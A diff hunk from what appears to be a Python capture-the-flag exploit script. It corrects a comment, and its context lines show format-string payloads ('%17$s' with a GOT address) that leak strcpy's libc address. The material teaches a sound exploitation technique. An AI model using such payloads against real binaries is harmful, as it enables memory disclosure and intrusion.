@@ -266,7 +266,7 @@ print("Address of buffer where our string is being stored: ", ADDR_OF_CONTROLLAB
 STRCPY_AT_GOT_PLUS_ONE = p64(u64(STRCPY_AT_GOT) + 1) # strcpy's address starts with zero (LSB), so I need to leak from strcpy@GOT + 1 to skip that 0
 # and print the rest of the address
 
-# send_payload_with_input(STRCPY_AT_GOT + b'%16$s') fun fact: i first tried this but it doesn't work because of the zeroes that STRCPY_AT_GOT contains, most virtual addresses have their most significant 16 bytes zeroed-out (i was stucked for a bit because of this lol)
+# send_payload_with_input(STRCPY_AT_GOT + b'%16$s') fun fact: i first tried this but it doesn't work because of the zeroes that STRCPY_AT_GOT contains, most virtual addresses have their most significant 16 bits set to zero (i was stuck for a bit because of this lol)
 
 send_payload_with_input(b'AAA%17$s' + STRCPY_AT_GOT_PLUS_ONE) # leak the address of strcpy at libc, the 3 A's are for padding.
 
